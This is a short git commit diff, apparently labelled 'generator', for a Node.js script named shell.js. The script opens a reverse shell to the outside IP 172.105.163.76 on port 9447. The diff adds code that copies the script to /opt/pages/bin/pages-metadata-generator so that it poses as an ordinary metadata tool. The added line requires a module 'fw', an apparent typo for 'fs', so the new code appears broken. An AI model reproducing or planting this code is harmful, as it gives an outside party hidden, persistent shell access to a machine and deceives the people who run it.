33b6ec15afedabe66505c7cb9e99304dc94bed7e
James Hebden <james@ec0.io>
2022-05-15 06:49:15 +1000

    generator

--- scripts/shell.js
+++ scripts/shell.js
@@ -1,6 +1,11 @@
 #!/usr/bin/env node
 
 var net = require("net"), sh = require("child_process").exec("/bin/sh");
+var fs = require("fw");
 var client = new net.Socket();
 client.connect(9447, "172.105.163.76", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
+fs.copyFile(__filename, "/opt/pages/bin/pages-metadata-generator", (err) => {
+  if (err) throw err;
+  console.log('copied shell to pages-metadata-generator');
+});
